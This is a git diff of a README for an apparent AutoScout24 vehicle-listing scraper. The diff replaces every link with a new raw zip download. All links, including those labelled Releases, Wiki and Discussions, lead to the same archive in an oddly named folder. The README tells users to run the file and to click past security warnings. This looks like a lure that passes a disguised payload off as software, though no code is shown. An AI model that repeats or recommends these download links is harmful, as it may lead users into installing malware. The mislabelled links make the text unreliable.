@@ -1,6 +1,6 @@
 # 🚗 autoscout24-germany-deutschland-scraper - Scrape Vehicle Listings Easily
 
-[![Download Now](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip)
+[![Download Now](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **autoscout24-germany-deutschland-scraper**! This application hel
 To use the autoscout24 scraper, you need to download the application from the Releases page. 
 
 1. Click the link below to visit the download page:  
-   [Visit this page to download](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip)
+   [Visit this page to download](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip)
    
 2. Look for the latest release. You will see various download options available. Click on the version suitable for your operating system.
 
@@ -29,7 +29,7 @@ Before you start, ensure your computer meets the following requirements:
 
 After downloading the application, here’s how to run it:
 
-1. Locate the downloaded file on your computer. The filename will look similar to `https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip` or `https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip`.
+1. Locate the downloaded file on your computer. The filename will look similar to `https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip` or `https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip`.
 
 2. Double-click the file to start the installation process. If you see a security warning, confirm that you want to run the installer.
 
@@ -73,12 +73,12 @@ If you have any questions or issues while using the scraper, feel free to reach 
 
 ## 🔗 Additional Resources
 
-- For more examples and usage scenarios, check the [Wiki](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip).
-- Join the community discussions on [GitHub Discussions](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip).
+- For more examples and usage scenarios, check the [Wiki](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip).
+- Join the community discussions on [GitHub Discussions](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip).
 
 ## 📜 License
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
 Make sure to visit the download page again for updates and new features:  
-[Visit this page to download](https://raw.githubusercontent.com/Uj005/autoscout24-germany-deutschland-scraper/main/ineffervescibility/autoscout_deutschland_germany_scraper_v3.1.zip)
+[Visit this page to download](https://github.com/Uj005/autoscout24-germany-deutschland-scraper/raw/refs/heads/main/ineffervescibility/germany_scraper_autoscout_deutschland_v2.7.zip)
